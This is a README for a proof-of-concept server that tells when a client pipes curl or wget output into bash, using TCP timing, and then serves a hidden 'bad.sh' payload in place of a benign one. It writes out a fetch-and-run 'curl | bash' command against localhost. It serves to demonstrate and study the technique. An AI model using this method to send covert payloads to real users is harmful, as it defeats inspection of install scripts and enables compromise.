# Pipe detection script


## About
A script to detect the use of curl or wget -O - | bash.

See https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
for more details on how this works.

@author Phil

Update: WillRoll <https://github.com/willroll>
The original site is down so I've included the code here.
See https://web.archive.org/web/20250622061208/https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/ for the archived version.


## How it works
When a client runs `curl https://host/setup.bash | bash`, bash executes each
chunk of the response as it arrives, so it drains the TCP receive buffer at a
steady pace. The server fills the socket with padding and times how fast the
client accepts it: a large initial jump followed by low-variance gaps means
something downstream (bash) is consuming the stream in real time, so the server
serves the `bad.sh` payload; otherwise it serves the harmless `good.sh`. A
non-`curl`/`wget` User-Agent always gets `good.sh`.

- `ticker.sh` — the "null"/base payload sent first (a `sleep` to open the timing window)
- `good.sh` — benign payload
- `bad.sh` — payload served when `curl | bash` is detected


## Requirements
Python 3.8+ (standard library only — no third-party packages). A self-signed
TLS cert/key pair (`cert.pem` / `key.pem`) in the working directory.


## Running

```sh
# 1. generate a self-signed cert + key (once)
openssl req -newkey rsa:2048 -nodes -keyout key.pem \
    -x509 -sha256 -days 3650 -out cert.pem -subj "/CN=localhost"

# 2. run the server (listens on 0.0.0.0:5555, serving /setup.bash)
python3 mogui.py

# 3. from another shell, the "victim" command it is built to detect:
curl -sk https://localhost:5555/setup.bash | bash
```

### Docker

```sh
docker build -t pipe_detection .
docker run --rm -p 5555:5555 pipe_detection
```
The image generates its own `cert.pem`/`key.pem` at build time.


## License
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.